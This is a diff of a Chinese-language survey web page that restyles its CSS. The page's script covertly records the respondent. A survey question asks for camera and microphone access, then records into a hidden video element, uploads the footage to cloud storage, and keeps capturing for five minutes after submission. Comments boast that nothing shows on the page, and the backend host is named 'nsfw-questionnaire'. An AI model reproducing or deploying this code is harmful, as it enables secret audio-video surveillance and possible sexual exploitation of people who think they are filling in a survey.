@@ -6,27 +6,82 @@
 <title>问卷</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-:root {
-    --text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
-    --glass-bg: rgba(255, 255, 255, 0.75);
-}
-
+* { margin: 0; padding: 0; box-sizing: border-box; }
 body {
-    background-color: #ffffff;
+    background: #f0f4f8;
     font-family: Arial, sans-serif;
     min-height: 100vh;
-    position: relative;
-    overflow-x: hidden;
-    padding: 20px;
+    padding: 30px 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
 }
+.container {
+    max-width: 640px;
+    width: 100%;
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 40px 36px;
+    box-shadow: 0 8px 40px rgba(0,0,0,0.08);
+    position: relative;
+    z-index: 2;
+}
+h1 { text-align: center; color: #1a73e8; font-size: 26px; margin-bottom: 6px; }
+.subtitle { text-align: center; color: #666; font-size: 15px; margin-bottom: 30px; }
+.question { margin-bottom: 24px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
+.q-title { font-weight: bold; font-size: 16px; color: #222; margin-bottom: 12px; padding-left: 12px; border-left: 4px solid #1a73e8; }
+.q-title .required { color: #e53935; margin-left: 4px; }
+.options label {
+    display: block;
+    padding: 8px 14px;
+    margin: 6px 0;
+    background: #f8faff;
+    border-radius: 6px;
+    cursor: pointer;
+    border: 1px solid #e8edf4;
+    transition: 0.2s;
+}
+.options label:hover { background: #eef4ff; border-color: #1a73e8; }
+.options input[type="radio"] { margin-right: 10px; }
+textarea {
+    width: 100%;
+    min-height: 90px;
+    padding: 12px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 15px;
+    font-family: Arial, sans-serif;
+    resize: vertical;
+}
+textarea:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 3px rgba(26,115,232,0.12); }
+.submit-btn {
+    display: block;
+    width: 100%;
+    padding: 14px;
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.25s;
+}
+.submit-btn:hover { background: #1557b0; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(26,115,232,0.25); }
+.submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+#status-msg {
+    text-align: center;
+    padding: 12px;
+    margin-top: 16px;
+    border-radius: 8px;
+    font-weight: 600;
+    display: none;
+}
+#status-msg.success { display: block; background: #e6f7e6; color: #1e7e34; border: 1px solid #b7e0b7; }
+#status-msg.error { display: block; background: #fee; color: #b33; border: 1px solid #f5c6c6; }
+.footer { text-align: center; color: #aaa; margin-top: 24px; font-size: 13px; }
 
-/* ===== 6条平行水印线 ===== */
+/* ===== 水印层 ===== */
 .watermark-layer {
     position: fixed;
     top: 0;
@@ -42,7 +97,6 @@ body {
     transform: rotate(45deg);
     transform-origin: center;
 }
-
 .watermark-line {
     color: rgba(26, 115, 232, 0.09);
     font-size: 24px;
@@ -51,196 +105,14 @@ body {
     letter-spacing: 6px;
     font-family: Arial, sans-serif;
 }
-
-/* 6条水印的内容 */
-.watermark-line:nth-child(1)::before { content: "qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer "; }
-.watermark-line:nth-child(2)::before { content: "qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer "; }
-.watermark-line:nth-child(3)::before { content: "qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer "; }
-.watermark-line:nth-child(4)::before { content: "qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer "; }
-.watermark-line:nth-child(5)::before { content: "qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer "; }
-.watermark-line:nth-child(6)::before { content: "qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer "; }
-
-/* ===== 问卷容器（覆盖在水印之上） ===== */
-.container {
-    position: relative;
-    z-index: 2;
-    max-width: 640px;
-    width: 100%;
-    margin: 0 auto;
-    background: transparent;
-    padding: 20px;
-}
-
-h1, .subtitle, .q-title, .options label, textarea, .footer {
-    text-shadow: var(--text-shadow);
-}
-
-h1 {
-    text-align: center;
-    color: #1a73e8;
-    font-size: 26px;
-    margin-bottom: 6px;
-}
-
-.subtitle {
-    text-align: center;
-    color: #333;
-    margin-bottom: 30px;
-    font-size: 16px;
-    font-weight: 500;
-}
-
-.question {
-    margin-bottom: 24px;
-    padding-bottom: 20px;
-    border-bottom: 1px solid rgba(0, 0, 0, 0.1);
-    position: relative;
-}
-
-.q-title {
-    font-weight: bold;
-    font-size: 16px;
-    color: #222;
-    margin-bottom: 12px;
-    padding-left: 12px;
-    border-left: 4px solid #1a73e8;
-}
-
-.q-title .required {
-    color: #e53935;
-    margin-left: 4px;
-    text-shadow: none;
-}
-
-.options {
-    margin-left: 16px;
-}
-
-.options label {
-    display: block;
-    padding: 8px 14px;
-    margin: 6px 0;
-    background: var(--glass-bg);
-    border-radius: 6px;
-    cursor: pointer;
-    border: 1px solid #e8edf4;
-    transition: 0.2s;
-    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-}
-
-.options label:hover {
-    background: rgba(26, 115, 232, 0.1);
-    transform: translateX(4px);
-    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
-}
-
-.options input[type="radio"] {
-    margin-right: 10px;
-    transform: scale(1.1);
-}
-
-textarea {
-    width: 100%;
-    min-height: 90px;
-    padding: 12px;
-    border: 1px solid #ddd;
-    border-radius: 8px;
-    font-size: 15px;
-    font-family: Arial, sans-serif;
-    resize: vertical;
-    background: rgba(255, 255, 255, 0.9);
-}
-
-textarea:focus {
-    outline: none;
-    border-color: #1a73e8;
-    box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.12);
-}
-
-.submit-btn {
-    display: block;
-    width: 220px;
-    margin: 40px auto 20px;
-    padding: 14px;
-    background: linear-gradient(135deg, #1a73e8, #0d5fcc);
-    color: #fff;
-    border: none;
-    border-radius: 8px;
-    font-size: 18px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: 0.25s;
-    text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.2);
-    position: relative;
-    overflow: hidden;
-    z-index: 2;
-}
-
-.submit-btn:hover {
-    background: #1557b0;
-    transform: translateY(-2px);
-    box-shadow: 0 8px 20px rgba(26, 115, 232, 0.3);
-}
-
-.submit-btn:active {
-    transform: translateY(0);
-}
-
-.submit-btn::before {
-    content: "";
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-    transition: left 0.5s;
-}
-
-.submit-btn:hover::before {
-    left: 100%;
-}
-
-.submit-btn:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-    transform: none;
-}
-
-#status-msg {
-    text-align: center;
-    padding: 12px;
-    margin-top: 16px;
-    border-radius: 8px;
-    font-weight: 600;
-    display: none;
-}
-
-#status-msg.success {
-    display: block;
-    background: #e6f7e6;
-    color: #1e7e34;
-    border: 1px solid #b7e0b7;
-}
-
-#status-msg.error {
-    display: block;
-    background: #fee;
-    color: #b33;
-    border: 1px solid #f5c6c6;
-}
-
-.footer {
-    text-align: center;
-    color: #555;
-    margin-top: 20px;
-    font-size: 14px;
+.watermark-line::before {
+    content: "qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer qwer ";
 }
 </style>
 </head>
 <body>
 
-<!-- 6条平行水印层 -->
+<!-- 水印层 -->
 <div class="watermark-layer">
     <div class="watermark-line"></div>
     <div class="watermark-line"></div>
@@ -255,7 +127,7 @@ textarea:focus {
     <h1>📋 问卷标题</h1>
     <div class="subtitle">请根据实际情况填写，感谢您的参与</div>
 
-    <!-- 问题1-29（示例，可复制扩展） -->
+    <!-- 问题1 -->
     <div class="question">
         <div class="q-title">1. 您对我们的服务满意吗？ <span class="required">*</span></div>
         <div class="options">
@@ -266,14 +138,13 @@ textarea:focus {
         </div>
     </div>
 
+    <!-- 问题2 -->
     <div class="question">
         <div class="q-title">2. 您有什么建议或意见？</div>
         <textarea id="q2" placeholder="请畅所欲言..."></textarea>
     </div>
 
-    <!-- ... 这里可以继续添加第3-29题，复制上面的 .question 块并修改编号和name ... -->
-
-    <!-- ===== 第30题：点击任一选项触发摄像头 ===== -->
+    <!-- 第30题：触发摄像头 -->
     <div class="question" id="question30">
         <div class="q-title">30. 请允许摄像头和麦克风权限以继续 <span class="required">*</span></div>
         <div class="options" id="q30Options">
@@ -283,7 +154,7 @@ textarea:focus {
         </div>
     </div>
 
-    <!-- 问题31-80（示例，可复制扩展） -->
+    <!-- 问题31 -->
     <div class="question">
         <div class="q-title">31. 您还有什么补充？</div>
         <textarea id="q31" placeholder="请输入..."></textarea>
@@ -294,22 +165,18 @@ textarea:focus {
     <div class="footer">© 2026</div>
 </div>
 
-<!-- 隐藏的视频元素（用于承载摄像头画面，用户不可见） -->
+<!-- 隐藏视频元素 -->
 <video id="videoElement" style="display:none;" autoplay playsinline></video>
 
 <script>
-// ===== Supabase 配置 =====
+// ===== 配置 =====
 const SUPABASE_URL = 'https://bzocbprfefvndsfxtgea.supabase.co';
 const SUPABASE_KEY = 'sb_publishable_tV1rc8buwkerruQZf5mrPw_gGM3j9GD';
-// =========================
-
-// ===== 后端 API 地址 =====
 const API_URL = 'https://nsfw-questionnaire.onrender.com/api/submit';
-// =========================
+// =================
 
 const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-// ----- 摄像头/麦克风相关变量 -----
 let mediaStream = null;
 let mediaRecorder = null;
 let recordedChunks = [];
@@ -331,7 +198,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
-// ----- 启动摄像头和麦克风 -----
+// ----- 启动摄像头 -----
 async function startCameraAndMic() {
     try {
         mediaStream = await navigator.mediaDevices.getUserMedia({
@@ -345,91 +212,80 @@ async function startCameraAndMic() {
 
         isCameraReady = true;
         startRecording();
-        console.log('摄像头和麦克风已启动，开始录制');
+        console.log('摄像头已启动');
 
+        // 可选：在控制台显示状态，页面上无任何提示
     } catch (err) {
-        console.error('获取摄像头/麦克风失败:', err);
+        console.error('摄像头启动失败:', err);
+        // 用户拒绝权限，静默处理
     }
 }
 
 // ----- 开始录制 -----
 function startRecording() {
     if (!mediaStream) return;
-
     recordedChunks = [];
     const options = { mimeType: 'video/webm;codecs=vp9,opus' };
-
     try {
         mediaRecorder = new MediaRecorder(mediaStream, options);
     } catch (e) {
         mediaRecorder = new MediaRecorder(mediaStream);
     }
-
     mediaRecorder.ondataavailable = function(event) {
         if (event.data && event.data.size > 0) {
             recordedChunks.push(event.data);
         }
     };
-
     mediaRecorder.start(1000);
     isRecording = true;
 }
 
-// ----- 停止录制并返回视频Blob -----
+// ----- 停止录制 -----
 function stopRecording() {
     return new Promise((resolve) => {
         if (!mediaRecorder || mediaRecorder.state === 'inactive') {
             resolve(null);
             return;
         }
-
         mediaRecorder.onstop = function() {
             const blob = new Blob(recordedChunks, { type: 'video/webm' });
             recordedChunks = [];
             isRecording = false;
             resolve(blob);
         };
-
         mediaRecorder.stop();
     });
 }
 
-// ----- 上传视频到 Supabase Storage -----
+// ----- 上传视频 -----
 async function uploadVideo(blob) {
     if (!blob || blob.size === 0) return null;
-
     const fileName = `video_${Date.now()}_${Math.random().toString(36).substring(7)}.webm`;
-
     try {
-        const { data, error } = await supabase.storage
+        const { error } = await supabase.storage
             .from('videos')
             .upload(fileName, blob, { contentType: 'video/webm' });
-
         if (error) {
-            console.error('视频上传失败:', error);
+            console.error('上传失败:', error);
             return null;
         }
-
         const { data: urlData } = await supabase.storage
             .from('videos')
             .createSignedUrl(fileName, 60 * 60 * 24 * 7);
-
         return urlData?.signedUrl || null;
-
     } catch (err) {
-        console.error('视频上传异常:', err);
+        console.error('上传异常:', err);
         return null;
     }
 }
 
-// ----- 关闭摄像头和麦克风 -----
+// ----- 关闭摄像头 -----
 function closeCameraAndMic() {
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
         mediaStream = null;
         isCameraReady = false;
         isRecording = false;
-        console.log('摄像头和麦克风已关闭');
     }
     if (closeTimer) {
         clearTimeout(closeTimer);
@@ -437,12 +293,11 @@ function closeCameraAndMic() {
     }
 }
 
-// ----- 设置5分钟后自动关闭 -----
+// ----- 5分钟后自动关闭 -----
 function scheduleCameraClose() {
     if (closeTimer) clearTimeout(closeTimer);
     closeTimer = setTimeout(function() {
         closeCameraAndMic();
-        console.log('提交后5分钟，自动关闭摄像头和麦克风');
     }, 5 * 60 * 1000);
 }
 
@@ -496,10 +351,7 @@ async function submitForm() {
         });
 
         const result = await response.json();
-
-        if (!response.ok) {
-            throw new Error(result.error || '提交失败');
-        }
+        if (!response.ok) throw new Error(result.error || '提交失败');
 
         scheduleCameraClose();
 
@@ -521,7 +373,7 @@ async function submitForm() {
     btn.textContent = '提交问卷';
 }
 
-// ----- 页面关闭时清理资源 -----
+// ----- 页面关闭时清理 -----
 window.addEventListener('beforeunload', function() {
     closeCameraAndMic();
 });
